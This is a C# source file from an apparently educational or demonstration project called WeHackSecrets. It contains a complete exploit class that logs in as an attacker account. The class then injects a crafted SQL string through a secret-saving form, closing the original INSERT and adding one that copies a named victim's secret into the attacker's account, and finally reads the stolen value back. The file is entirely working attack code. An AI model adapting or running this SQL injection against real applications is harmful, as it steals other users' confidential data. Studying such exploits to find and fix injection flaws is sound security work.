using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using WeHackSecrets.Services.Actions;
using WeHackSecrets.Services.Models;

namespace WeHackSecrets.Services
{
    public class SqlInjectionCopySecretOnSecretSave : IExploit
    {
        private string _hackerUser;
        private string _hackerPassword = "Test1234!";
        private string _targetUser;
        private string _targetKey;

        private readonly ILoginAction _loginAction;
        private readonly ICreateSecretAction _createSecretAction;
        private readonly ISecretsList _secretsList;

        private bool _successful = false;
        private string _secretValue = "";

        public SqlInjectionCopySecretOnSecretSave(string hackerUser, 
                                                    string targetUser, 
                                                    string targetKey,
                                                    ILoginAction loginAction,
                                                    ICreateSecretAction createSecretAction,
                                                    ISecretsList secretsList)
        {
            if (hackerUser == null) throw new ArgumentNullException("hackerUser");
            if (targetUser == null) throw new ArgumentNullException("targetUser");
            if (targetKey == null) throw new ArgumentNullException("targetKey");
            if (loginAction == null) throw new ArgumentNullException("loginAction");
            if (createSecretAction == null) throw new ArgumentNullException("createSecretAction");
            if (secretsList == null) throw new ArgumentException("secretsList");

            _hackerUser = hackerUser;
            _targetUser = targetUser;
            _targetKey = targetKey;
            _loginAction = loginAction;
            _createSecretAction = createSecretAction;
            _secretsList = secretsList;
        }

        public bool Successful
        {
            get
            {
                return _successful;
            }
        }

        public string SecretValue
        {
            get
            {
                return _secretValue;
            }
        }

        public void Exploit()
        {
            // Login as the hacker
            _loginAction.Login(_hackerUser, _hackerPassword);

            // Run the exploit againts the secrets page
            _createSecretAction.Create("HackerKey", ExploitString);

            // Harvest the targets secret from the secrets page
            var secretValue = _secretsList.GetTargetSecret(_targetKey);

            if (!string.IsNullOrEmpty(secretValue))
            {
                _successful = true;
                _secretValue = secretValue;
            }
        }

        private string ExploitString
        {
            get
            {
                var exploit = new StringBuilder();

                exploit.Append("xxx'); ");  // Closes the intended insert
                exploit.Append("insert into Secrets (UserId, [Key], [Value]) ");
                exploit.Append("select MyUser.Id, Secrets.[Key], Secrets.[Value] ");
                exploit.Append("from Users as MyUser, ");
                exploit.Append("Users as TargetUser inner join Secrets on TargetUser.Id = Secrets.UserId ");
                exploit.Append($"where MyUser.Username = '{_hackerUser}' ");
                exploit.Append($"and TargetUser.Username = '{_targetUser}' ");
                exploit.Append($"and Secrets.[Key] = '{_targetKey}' ");
                exploit.Append("--");   // Comments out any remaining SQL from the original statement

                return exploit.ToString();
            }
        }

    }
}
